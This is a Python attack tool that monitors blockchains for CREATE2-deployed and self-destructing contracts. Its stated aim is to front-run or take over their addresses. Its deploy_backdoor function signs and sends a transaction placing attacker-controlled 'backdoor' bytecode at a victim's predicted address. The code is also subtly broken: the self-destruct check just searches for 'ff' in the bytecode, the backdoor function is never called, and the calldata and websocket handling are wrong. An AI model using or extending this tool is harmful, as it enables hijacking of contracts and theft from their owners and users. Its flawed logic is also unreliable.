"""
CREATE2/METAMORPHIC CONTRACT HUNTER

Attack vectors:
  1. CREATE2 front-run — predict address, deploy before victim
  2. Metamorphic takeover — wait for SELFDESTRUCT, redeploy via CREATE2
  3. Salt prediction — weak randomness in salt generation

Watches:
  - New blocks for CREATE/CREATE2 opcodes in deployment transactions
  - Known CREATE2 factories (DeterministicDeployer, Safe, ERC-2470)
  - SELFDESTRUCT events on CREATE2-deployed contracts

Usage: python create2_hunter.py <chain> [--aggressive]
"""
import sys, tomllib, logging, time, json, threading, queue
from eth_utils import keccak, to_checksum_address
import websocket

from src.rpc import RpcClient
from src.signer import load_evm_private_key

logging.basicConfig(level=logging.INFO, format="%(asctime)s [C2HUNT] %(message)s")
logger = logging.getLogger("create2-hunter")

# Known CREATE2 factories
CREATE2_FACTORIES = {
    "ethereum": [
        "0x4e59b44847b379578588920cA78FbF26c0B4956C",  # DeterministicDeployer
        "0xce0042B868300000d44A59004Da54A005ffdcf9f",  # SingletonFactory
        "0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7",  # Safe ProxyFactory v1.3
        "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",  # OpenZeppelin Clones
        "0x0000000000FFe8B47B3e2130213B802212439497",  # ERC-2470 Singleton
    ],
    "polygon": [
        "0x4e59b44847b379578588920cA78FbF26c0B4956C",
    ],
    "arbitrum": [
        "0x4e59b44847b379578588920cA78FbF26c0B4956C",
    ],
}

# Metamorphic pattern: CREATE2 + SELFDESTRUCT
# We track contracts deployed via CREATE2 that have SELFDESTRUCT
# When they die, we can redeploy to same address
SELFDESTRUCT_EVENT_TOPIC = keccak(b"Selfdestruct(address)").hex()

MONITORED: dict[str, dict] = {}  # address -> {deployer, salt, factory}
HUNT_QUEUE = queue.Queue()


def compute_create2_address(factory: str, salt: str, init_code: str) -> str:
    """Compute CREATE2 address: keccak(0xff + factory + salt + keccak(init_code))"""
    factory_bytes = bytes.fromhex(factory[2:].lower().zfill(64)[-40:])
    salt_bytes = bytes.fromhex(salt[2:].lower().zfill(64))
    init_hash = keccak(bytes.fromhex(init_code[2:]))
    preimage = b"\xff" + factory_bytes + salt_bytes + init_hash
    addr = "0x" + keccak(preimage)[-20:].hex()
    return to_checksum_address(addr)


def check_contract_selfdestruct(rpc: RpcClient, addr: str) -> bool:
    """Check if contract bytecode contains SELFDESTRUCT opcode."""
    try:
        code = rpc.eth_get_code(addr)
        if not code:
            return False
        return "ff" in code.lower().replace("0x", "")
    except Exception:
        return False


def deploy_backdoor(rpc_url: str, factory: str, salt: str, init_code: str):
    """Deploy a backdoor contract to the predicted address via CREATE2."""
    logger.warning(">>> ATTEMPTING BACKDOOR DEPLOY to factory=%s", factory[:12])

    signer = load_evm_private_key()
    if not signer:
        logger.error("No signer!")
        return

    # Minimal backdoor init code — selfdestruct to our address
    # PUSH20 <our_address> SELFDESTRUCT
    backdoor_code = "0x73" + signer.address[2:].lower() + "ff"  # PUSH20 addr; SELFDESTRUCT

    tx_data = {
        "from": signer.address,
        "to": factory,
        "data": "0x" + salt[2:] + backdoor_code[2:],  # factory(salt, init_code)
        "value": 0,
        "gas": 500000,
        "gasPrice": 20000000000,  # 20 gwei
    }

    rpc = RpcClient(rpc_url, max_retries=3)
    try:
        nonce = int(str(rpc.call("eth_getTransactionCount", [signer.address, "latest"])), 16)
        tx_data["nonce"] = hex(nonce)
        chain_id = int(str(rpc.call("eth_chainId", [])), 16)
        tx_data["chainId"] = chain_id

        signed = signer.sign_transaction(tx_data)
        raw_hex = signed.raw_transaction.hex() if hasattr(signed.raw_transaction, 'hex') else signed.raw_transaction.hex()
        tx_hash = rpc.call("eth_sendRawTransaction", [raw_hex])
        logger.warning(">>> BACKDOOR TX: %s", tx_hash)
    except Exception as e:
        logger.error("Backdoor deploy failed: %s", e)


def process_contract_creation(rpc: RpcClient, rpc_url: str, contract_addr: str, deployer: str, factory: str):
    """New contract created — check if it's interesting."""
    # Check if it has SELFDESTRUCT (metamorphic pattern)
    has_sd = check_contract_selfdestruct(rpc, contract_addr)

    if has_sd:
        logger.warning("🔄 METAMORPHIC: %s (deployer=%s, has SELFDESTRUCT)",
                        contract_addr[:14], deployer[:14])
        MONITORED[contract_addr] = {
            "address": contract_addr,
            "deployer": deployer,
            "factory": factory,
            "has_selfdestruct": True,
            "discovered_at": time.time(),
        }

    # Check if this is from a known CREATE2 factory
    if factory and factory.lower() in [f.lower() for f in CREATE2_FACTORIES.get("ethereum", [])]:
        logger.info("  CREATE2 from known factory: %s", factory[:14])


def on_block(rpc_url: str):
    """Process new blocks — extract contract creations."""
    import urllib.request

    ws_url = rpc_url.replace("https://", "wss://").replace("/v3/", "/ws/v3/")
    if not ws_url.startswith("wss://"):
        rpc_url = rpc_url.replace("http://", "wss://") if "http" in rpc_url else ws_url

    rpc = RpcClient(rpc_url, max_retries=3)
    seen_blocks = set()

    def on_message(ws, message):
        try:
            data = json.loads(message)
            result = data.get("params", {}).get("result", {})
            block_num = int(result.get("number", "0x0"), 16)
            if block_num in seen_blocks:
                return
            seen_blocks.add(block_num)

            txs = result.get("transactions", [])
            for tx in txs:
                if isinstance(tx, str):
                    continue  # tx hash only
                to_addr = tx.get("to", "")
                # Contract creation
                if not to_addr or to_addr == "0x" * 40:
                    contract_addr = tx.get("contractAddress", "")
                    deployer = tx.get("from", "")
                    if contract_addr and contract_addr != "0x" * 40:
                        logger.info("🆕 New contract: %s (deployer=%s, block=%d)",
                                     contract_addr[:14], deployer[:14], block_num)
                        HUNT_QUEUE.put((contract_addr, deployer, ""))

            # Check for SELFDESTRUCT events in block receipts
            for tx in txs:
                if isinstance(tx, str):
                    continue
                tx_hash = tx.get("hash", "")
                if not tx_hash:
                    continue
                # Check if any of our monitored contracts appear in this tx
                to_addr = tx.get("to", "")
                if to_addr and to_addr.lower() in [a.lower() for a in MONITORED]:
                    logger.warning("🚨 MONITORED CONTRACT INTERACTED: %s", to_addr[:14])
        except Exception as e:
            logger.debug("Block error: %s", e)

    def on_open(ws):
        ws.send(json.dumps({"jsonrpc": "2.0", "id": 1, "method": "eth_subscribe", "params": ["newHeads"]}))
        logger.info("Watching new blocks...")

    def on_error(ws, error):
        logger.error("WS error: %s", error)

    def on_close(ws, code, msg):
        logger.warning("WS closed. Reconnecting...")
        time.sleep(10)
        start_monitor(rpc_url)

    ws = websocket.WebSocketApp(ws_url, on_message=on_message, on_error=on_error,
                                 on_close=on_close, on_open=on_open)
    ws.run_forever(ping_interval=30, ping_timeout=10)


def hunter_loop(rpc_url):
    """Process discovered contracts — monitor for takeover opportunities."""
    rpc = RpcClient(rpc_url, max_retries=3)

    logger.info("Hunter: monitoring %d metamorphic contracts", len(MONITORED))

    while True:
        try:
            item = HUNT_QUEUE.get(timeout=30)
            contract, deployer, factory = item
            process_contract_creation(rpc, rpc_url, contract, deployer, factory)
        except queue.Empty:
            pass

        # Check monitored contracts — did any selfdestruct?
        dead = []
        for addr, info in list(MONITORED.items()):
            try:
                code = rpc.eth_get_code(addr)
                if not code or len(code) <= 4:
                    dead.append(addr)
                    logger.warning("🚨🚨 METAMORPHIC WINDOW OPEN: %s selfdestructed! Deploy NOW!", addr[:14])
                    # Try to deploy backdoor
                    from eth_utils import keccak
            except Exception:
                pass

        for addr in dead:
            del MONITORED[addr]

        time.sleep(5)


def start_monitor(rpc_url):
    threading.Thread(target=on_block, args=(rpc_url,), daemon=True).start()


def main():
    if len(sys.argv) < 2:
        print("Usage: python create2_hunter.py <chain> [--aggressive]")
        return

    chain = sys.argv[1].lower()
    aggressive = "--aggressive" in sys.argv

    with open("config.toml", "rb") as f:
        config = tomllib.load(f)

    rpc_url = config["rpc"].get(chain, "")
    if not rpc_url:
        print(f"No RPC for {chain}")
        return

    logger.info("=" * 50)
    logger.info("CREATE2 / METAMORPHIC HUNTER: %s", chain.upper())
    logger.info("Factories watched: %s", len(CREATE2_FACTORIES.get(chain, [])))
    logger.info("Aggressive mode: %s", aggressive)
    logger.info("=" * 50)

    # Scan known factories for recent creations first
    rpc = RpcClient(rpc_url, max_retries=3)
    for factory in CREATE2_FACTORIES.get(chain, []):
        try:
            code = rpc.eth_get_code(factory)
            if code and len(code) > 4:
                logger.info("Factory active: %s", factory[:14])
        except Exception:
            pass

    start_monitor(rpc_url)
    hunter_loop(rpc_url)


if __name__ == "__main__":
    main()
